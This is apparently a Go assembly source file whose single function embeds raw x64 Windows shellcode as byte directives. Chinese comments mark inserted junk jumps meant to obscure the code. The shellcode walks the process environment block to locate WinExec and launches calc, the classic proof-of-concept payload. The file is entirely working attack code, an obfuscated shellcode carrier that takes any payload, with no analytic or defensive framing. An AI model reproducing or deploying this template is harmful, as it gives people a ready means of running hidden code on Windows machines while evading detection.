//func scode()
TEXT ·scode(SB), $0
	BYTE $0x90
	//添加垃圾跳转
	XORQ R11,R11
	MOVQ $0x2,R12
j3:
    CMPL R11,R12
    JNE j4


    //需要执行的代码段

    XORQ R12,R12
j4:
    XORQ R13,R13
    MOVQ $0x2,R11
    CMPL R13,R12
    JNE j3

	BYTE $0x50
	BYTE $0x51
	BYTE $0x52
	BYTE $0x53
	BYTE $0x56
	BYTE $0x57
	BYTE $0x55
	BYTE $0x54
	BYTE $0x58
	BYTE $0x66
	BYTE $0x83
	BYTE $0xe4
	BYTE $0xf0
	BYTE $0x50
	BYTE $0x6a
	BYTE $0x60
	BYTE $0x5a
	BYTE $0x68
	BYTE $0x63
	BYTE $0x61
	BYTE $0x6c
	BYTE $0x63
	BYTE $0x54
	BYTE $0x59
	BYTE $0x48
	BYTE $0x29
	BYTE $0xd4
	BYTE $0x65
	BYTE $0x48
	BYTE $0x8b
	BYTE $0x32
	BYTE $0x48
	BYTE $0x8b
	BYTE $0x76
	BYTE $0x18
	BYTE $0x48
	BYTE $0x8b
	BYTE $0x76
	BYTE $0x10
	BYTE $0x48
	BYTE $0xad
	BYTE $0x48
	BYTE $0x8b
	BYTE $0x30
	BYTE $0x48
	BYTE $0x8b
	BYTE $0x7e
	BYTE $0x30
	BYTE $0x3
	BYTE $0x57
	BYTE $0x3c
	BYTE $0x8b
	BYTE $0x5c
	BYTE $0x17
	BYTE $0x28
	BYTE $0x8b
	BYTE $0x74
	BYTE $0x1f
	BYTE $0x20
	BYTE $0x48
	BYTE $0x1
	BYTE $0xfe
	BYTE $0x8b
	BYTE $0x54
	BYTE $0x1f
	BYTE $0x24
	BYTE $0xf
	BYTE $0xb7
	BYTE $0x2c
	BYTE $0x17
	BYTE $0x8d
	BYTE $0x52
	BYTE $0x2
	BYTE $0xad
	BYTE $0x81
	BYTE $0x3c
	BYTE $0x7
	BYTE $0x57
	BYTE $0x69
	BYTE $0x6e
	BYTE $0x45
	BYTE $0x75
	BYTE $0xef
	BYTE $0x8b
	BYTE $0x74
	BYTE $0x1f
	BYTE $0x1c
	BYTE $0x48
	BYTE $0x1
	BYTE $0xfe
	BYTE $0x8b
	BYTE $0x34
	BYTE $0xae
	BYTE $0x48
	BYTE $0x1
	BYTE $0xf7
	BYTE $0x99
	BYTE $0xff
	BYTE $0xd7
	BYTE $0x48
	BYTE $0x83
	BYTE $0xc4
	BYTE $0x68
	BYTE $0x5c
	BYTE $0x5d
	BYTE $0x5f
	BYTE $0x5e
	BYTE $0x5b
	BYTE $0x5a
	BYTE $0x59
	BYTE $0x58
	BYTE $0xc3
	RET